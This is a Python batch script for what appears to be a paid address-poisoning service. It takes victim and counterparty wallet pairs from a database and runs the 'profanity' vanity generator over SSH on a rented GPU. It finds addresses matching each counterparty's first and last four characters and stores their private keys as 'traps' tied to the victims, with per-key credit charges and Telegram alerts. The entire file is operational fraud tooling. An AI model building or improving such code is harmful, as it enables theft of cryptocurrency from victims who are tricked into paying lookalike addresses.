#!/usr/bin/env python3
"""
Batch generation script.
Reads pending_targets from the database, generates vanity addresses,
and stores traps in the traps table.

All file I/O has been replaced with database queries.
"""

import subprocess
import sys
import datetime
import re
import os
import time
import requests
import json
import signal
import argparse
import fcntl

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.retry import retry
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import encrypt

# --- Web3 for address derivation ---
try:
    from web3 import Web3
except ImportError:
    Web3 = None
    logger.warning("web3.py not installed; trap address derivation will be skipped.")

# --- Supabase client ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    print("[batch_generate] Supabase client initialized")
else:
    print("[batch_generate] Supabase client NOT initialized")

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase."""
    if not supabase:
        print("[update_job] Supabase client not initialized, cannot update")
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
    if status == "running" and "started_at" not in data:
        data["started_at"] = "now()"
    if status in ("completed", "failed"):
        data["completed_at"] = "now()"
    try:
        print(f"[update_job] Updating job {job_id} with {data}")
        result = supabase.table("jobs").update(data).eq("id", job_id).execute()
        print(f"[update_job] Update successful: {result}")
    except Exception as e:
        print(f"[update_job] Failed to update job {job_id}: {e}")
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

def get_user_id_from_campaign(campaign_id):
    """Get user_id from campaign."""
    if not supabase:
        return None
    try:
        result = supabase.table("campaigns").select("user_id").eq("id", campaign_id).execute()
        if result.data:
            return result.data[0]["user_id"]
    except Exception as e:
        logger.error(f"Failed to get user_id for campaign {campaign_id}: {e}")
    return None

# --- Credit helpers ---
def get_user_credits(user_id):
    if not supabase:
        return 0
    try:
        result = supabase.table("users").select("credits").eq("id", user_id).execute()
        if result.data:
            return float(result.data[0].get("credits", 0))
        return 0
    except Exception as e:
        logger.error(f"Failed to get credits for user {user_id}: {e}")
        return 0

def deduct_key_fee(user_id, job_id, campaign_id, fee):
    if not supabase:
        return False
    try:
        current = get_user_credits(user_id)
        if current < fee:
            logger.warning(f"Insufficient credits to deduct ${fee:.2f} for user {user_id}")
            return False
        new_credits = current - fee
        supabase.table("users").update({"credits": new_credits}).eq("id", user_id).execute()
        supabase.table("credit_transactions").insert({
            "user_id": user_id,
            "amount": -fee,
            "type": "fee_deduction",
            "status": "completed",
            "description": "Generation fee for 1 key",
            "completed_at": "now()"
        }).execute()
        supabase.table("generation_history").insert({
            "job_id": job_id,
            "campaign_id": campaign_id,
            "user_id": user_id,
            "keys_generated": 1,
            "fee": fee
        }).execute()
        logger.info(f"Deducted ${fee:.2f} from user {user_id}, remaining: ${new_credits:.2f}")
        return True
    except Exception as e:
        logger.error(f"Failed to deduct key fee: {e}")
        return False

# --- Multi‑chain config ---
CHAIN = getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None
NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'
logger.info(f"Batch generator running on chain: {CHAIN} ({NATIVE_SYMBOL})")

REMOTE_USER = config.BATCH_REMOTE_USER
REMOTE_HOST = config.BATCH_REMOTE_HOST
REMOTE_PORT = config.BATCH_REMOTE_PORT
REMOTE_PASSWORD = config.BATCH_REMOTE_PASSWORD
REMOTE_PATH = config.BATCH_REMOTE_PATH
CLORE_API_KEY = config.CLORE_API_KEY
CLORE_INSTANCE_ID = config.CLORE_INSTANCE_ID

# --- Database-based progress ---
def read_progress(chain):
    if not supabase:
        return -1
    try:
        result = supabase.table('generation_progress').select('last_index').eq('chain', chain).execute()
        if result.data:
            return result.data[0]['last_index']
        # If no record, create one with 0
        supabase.table('generation_progress').insert({'chain': chain, 'last_index': 0}).execute()
        return 0
    except Exception as e:
        logger.error(f"Failed to read progress: {e}")
        return -1

def write_progress(chain, index):
    if not supabase:
        return
    try:
        supabase.table('generation_progress')\
            .update({'last_index': index, 'updated_at': 'now()'})\
            .eq('chain', chain).execute()
    except Exception as e:
        logger.error(f"Failed to write progress: {e}")

def load_processed_counterparties():
    """Query traps table for already processed counterparties on this chain."""
    if not supabase:
        return set()
    try:
        # Get all campaigns for this chain
        campaigns_result = supabase.table('campaigns').select('id').eq('chain', CHAIN).execute()
        campaign_ids = [row['id'] for row in campaigns_result.data]
        if not campaign_ids:
            return set()
        # Get traps for those campaigns
        traps_result = supabase.table('traps').select('counterparty_address')\
            .in_('campaign_id', campaign_ids).execute()
        processed = {row['counterparty_address'].lower() for row in traps_result.data if row['counterparty_address']}
        logger.info(f"Found {len(processed)} already processed counterparties")
        return processed
    except Exception as e:
        logger.error(f"Failed to load processed counterparties: {e}")
        return set()

def fetch_pending_pairs():
    """Fetch unprocessed pairs from pending_targets table."""
    if not supabase:
        return []
    try:
        result = supabase.table('pending_targets')\
            .select('id, counterparty, victim')\
            .eq('chain', CHAIN)\
            .eq('processed', False)\
            .order('id')\
            .execute()
        return [(row['id'], row['counterparty'].lower(), row['victim'].lower()) for row in result.data]
    except Exception as e:
        logger.error(f"Failed to fetch pending pairs: {e}")
        return []

def mark_pair_processed(pair_id):
    if not supabase or not pair_id:
        return
    try:
        supabase.table('pending_targets').update({'processed': True})\
            .eq('id', pair_id).execute()
    except Exception as e:
        logger.error(f"Failed to mark pair {pair_id} as processed: {e}")

# --- Generate key (unchanged) ---
@retry(max_attempts=3, base_delay=2, exceptions=(Exception,))
def generate_key_for_counterparty(counterparty_address):
    """
    Connect to the remote GPU, run profanity with the counterparty's prefix/suffix,
    and return the private key (with 0x prefix) if found, else None.
    """
    addr = counterparty_address.lower().replace("0x", "")
    prefix = addr[:4]
    suffix = addr[-4:]

    wildcard = "X" * (40 - 4 - 4)
    match_pattern = f"{prefix}{wildcard}{suffix}"
    logger.info(f"Processing counterparty {counterparty_address} with pattern {match_pattern}")

    remote_cmd = f"cd {REMOTE_PATH} && ./profanity --matching '{match_pattern}'"
    ssh_cmd = (
        f'sshpass -p "{REMOTE_PASSWORD}" ssh '
        f'-o ConnectTimeout=15 '
        f'-o ServerAliveInterval=60 '
        f'-o StrictHostKeyChecking=no '
        f'-o UserKnownHostsFile=/dev/null '
        f'-p {REMOTE_PORT} '
        f'{REMOTE_USER}@{REMOTE_HOST} "{remote_cmd}"'
    )

    try:
        process = subprocess.Popen(
            ssh_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True,
            bufsize=1
        )

        private_key = None
        key_found = False

        for line in process.stdout:
            logger.debug(f"[REMOTE] {line.strip()}")
            if "Private:" in line and "Address:" in line:
                try:
                    key_part = line.split("Private:")[1].split("Address:")[0].strip()
                    addr_part = line.split("Address:")[1].strip().lower()
                    if addr_part.startswith("0x" + prefix) and addr_part.endswith(suffix):
                        private_key = key_part
                        key_found = True
                        logger.info(f"Found matching key for {counterparty_address}")
                        break
                except Exception as e:
                    logger.warning(f"Parse error: {e}")

        if key_found:
            process.terminate()
            time.sleep(0.5)
            if process.poll() is None:
                process.kill()
            return private_key

        try:
            process.wait(timeout=60)
        except subprocess.TimeoutExpired:
            process.kill()

        stderr = process.stderr.read()
        if stderr:
            logger.warning(f"SSH remote stderr: {stderr.strip()}")

        return None

    except Exception as e:
        logger.error(f"Error during SSH: {e}")
        raise

# --- Save trap (database only) ---
def save_trap(counterparty, victim, private_key, campaign_id):
    if not private_key:
        return
    if not supabase or not Web3:
        logger.error("Supabase or Web3 not available, cannot save trap")
        return
    try:
        w3 = Web3()
        account = w3.eth.account.from_key(private_key)
        trap_address = account.address.lower()
        enc_private = encrypt(private_key)
        data = {
            "campaign_id": campaign_id,
            "victim_address": victim.lower(),
            "counterparty_address": counterparty.lower(),
            "trap_private_key_enc": enc_private,
            "trap_address": trap_address,
            "is_caught": False,
        }
        supabase.table("traps").insert(data).execute()
        logger.info(f"Inserted trap {trap_address} for campaign {campaign_id}")
    except Exception as e:
        logger.error(f"Failed to insert trap: {e}")

# --- Cancel Clore instance ---
def cancel_clore_instance():
    logger.info("Cancelling Clore.ai instance...")
    if not CLORE_API_KEY or not CLORE_INSTANCE_ID:
        logger.warning("Clore API credentials missing. Skipping cancel.")
        return
    url = "https://api.clore.ai/v1/instance/cancel"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {CLORE_API_KEY}"
    }
    payload = {"instance_id": CLORE_INSTANCE_ID}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            logger.info("Instance cancelled successfully.")
        else:
            logger.error(f"Failed to cancel instance: {resp.status_code} - {resp.text}")
    except Exception as e:
        logger.error(f"Error cancelling instance: {e}")

def is_job_cancelled(job_id):
    if not supabase:
        return False
    try:
        result = supabase.table('jobs').select('status').eq('id', job_id).execute()
        if result.data:
            return result.data[0].get('status') == 'cancelled'
    except Exception:
        pass
    return False

# ─── NEW: Failure tracking and alert throttling ───
_failure_count = 0
_last_failure_alert_time = 0
_FAILURE_ALERT_COOLDOWN = 60  # seconds

def send_failure_alert(campaign_id, counterparty, error_msg=None):
    """Send a Telegram alert for a key generation failure, but throttle to avoid spam."""
    global _failure_count, _last_failure_alert_time
    _failure_count += 1
    now = time.time()
    if now - _last_failure_alert_time >= _FAILURE_ALERT_COOLDOWN:
        msg = f"⚠️ Key generation failed for {counterparty}"
        if error_msg:
            msg += f"\nError: {error_msg}"
        send_telegram(msg, campaign_id)
        _last_failure_alert_time = now
    # Always log the failure
    logger.warning(f"Key generation failed for {counterparty} (total failures: {_failure_count})")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--job-id', help='Job ID for tracking')
    parser.add_argument('--max-keys', type=int, help='Maximum number of keys to generate')
    args = parser.parse_args()
    job_id = args.job_id
    max_keys = args.max_keys

    campaign_id = None
    user_id = None

    # ─── Acquire lock ───
    lock_file_path = os.path.join(os.path.dirname(__file__), '..', 'batch_generate.lock')
    lock_f = None
    try:
        os.makedirs(os.path.dirname(lock_file_path), exist_ok=True)
        lock_f = open(lock_file_path, 'w')
        fcntl.flock(lock_f, fcntl.LOCK_EX | fcntl.LOCK_NB)
        print(f"[batch_generate] Acquired lock {lock_file_path}")
    except IOError:
        print("[batch_generate] Lock already held. GPU busy.")
        if job_id:
            campaign_id = get_campaign_id_from_job(job_id)
            if campaign_id:
                send_telegram("⏳ GPU is currently busy with another generation job. Your job has been queued.", campaign_id)
        sys.exit(1)

    if job_id:
        update_job(job_id, status='running')
        print(f"[batch_generate] Job {job_id} set to running")
        campaign_id = get_campaign_id_from_job(job_id)
        if campaign_id:
            user_id = get_user_id_from_campaign(campaign_id)

    setup_graceful_shutdown()

    # Reset failure counter per run
    global _failure_count, _last_failure_alert_time
    _failure_count = 0
    _last_failure_alert_time = 0

    # 1. Load already processed counterparties
    processed = load_processed_counterparties()

    # 2. Fetch pending pairs from database
    pending_pairs = fetch_pending_pairs()
    # Filter out already processed
    pending = [(pid, cp, v) for pid, cp, v in pending_pairs if cp not in processed]

    if not pending:
        logger.info("No pending pairs to process.")
        if job_id:
            update_job(job_id, status='completed', message='No pending pairs')
        sys.exit(0)

    total = len(pending)
    logger.info(f"Will process {total} new counterparties.")

    # 3. Resume from progress
    last_done = read_progress(CHAIN)
    start_index = last_done + 1
    if start_index >= total:
        logger.info("All victims already completed in a previous run.")
        if job_id:
            update_job(job_id, status='completed', progress=total, message='All done')
        sys.exit(0)

    if start_index > 0:
        logger.info(f"Resuming from index {start_index+1} of {total}")
        pending = pending[start_index:]

    # 4. Process
    fee_per_key = float(os.getenv("FEE_PER_KEY", "1.0"))
    success_count = 0
    stopped_due_to_credits = False
    stopped_due_to_cancellation = False
    reached_max_keys = False

    for idx, (pair_id, cp, victim) in enumerate(pending, start=start_index+1):
        # ─── Check cancellation ───
        if job_id and is_job_cancelled(job_id):
            logger.info("Job cancelled by user. Exiting.")
            send_telegram("🛑 Generation cancelled by user.", campaign_id)
            stopped_due_to_cancellation = True
            break

        # ─── Check max-keys limit ───
        if max_keys and success_count >= max_keys:
            logger.info(f"Reached max keys limit ({max_keys}). Stopping.")
            reached_max_keys = True
            break

        # ─── Check credit ───
        if campaign_id and user_id:
            credits = get_user_credits(user_id)
            if credits < fee_per_key:
                logger.info(f"Insufficient credits. Generated {success_count} keys. Stopping.")
                stopped_due_to_credits = True
                break

        logger.info(f"[{idx}/{total}] Generating key for {cp} (victim: {victim})...")
        try:
            key = generate_key_for_counterparty(cp)
            if key:
                save_trap(cp, victim, key, campaign_id)
                success_count += 1
                write_progress(CHAIN, idx)
                if campaign_id and user_id:
                    deduct_key_fee(user_id, job_id, campaign_id, fee_per_key)
                if job_id:
                    update_job(job_id, progress=idx)
                mark_pair_processed(pair_id)
            else:
                # ─── NEW: Notify on failure ───
                logger.warning(f"Failed to generate key for {cp}")
                send_failure_alert(campaign_id, cp, "No key found after SSH timeout")
        except Exception as e:
            # ─── NEW: Notify on exception ───
            logger.error(f"Error processing {cp}: {e}")
            send_failure_alert(campaign_id, cp, str(e))

    logger.info(f"Generated {success_count} keys out of {total}.")

    # 5. Cancel instance
    cancel_clore_instance()

    # 6. Final job status
    if job_id:
        if success_count == total and not stopped_due_to_credits and not stopped_due_to_cancellation and not reached_max_keys:
            update_job(job_id, status='completed', progress=total, message='All done')
        elif stopped_due_to_credits:
            update_job(job_id, status='completed', progress=success_count, message=f'Partial: {success_count}/{total} keys (insufficient credits)')
        elif stopped_due_to_cancellation:
            update_job(job_id, status='cancelled', progress=success_count, message=f'Cancelled by user after {success_count} keys')
        elif reached_max_keys:
            update_job(job_id, status='completed', progress=success_count, message=f'Completed: {success_count} keys (user limit)')
        else:
            update_job(job_id, status='failed', progress=success_count, message=f'{success_count}/{total} succeeded')

    # ─── Send final alert with failure summary ───
    status_message = f"🏁 Batch generation complete\nChain: {CHAIN}\nProcessed: {total} targets\nGenerated: {success_count} keys"
    if stopped_due_to_credits:
        status_message += f"\n⚠️ Stopped early due to insufficient credits."
    elif stopped_due_to_cancellation:
        status_message += f"\n🛑 Stopped by user."
    elif reached_max_keys:
        status_message += f"\n✅ Reached user-defined limit of {max_keys} keys."
    if _failure_count > 0:
        status_message += f"\n❌ {_failure_count} key generation failures."
    send_telegram(status_message, campaign_id)

    # Release lock
    if lock_f:
        try:
            fcntl.flock(lock_f, fcntl.LOCK_UN)
            lock_f.close()
        except:
            pass

if __name__ == "__main__":
    main()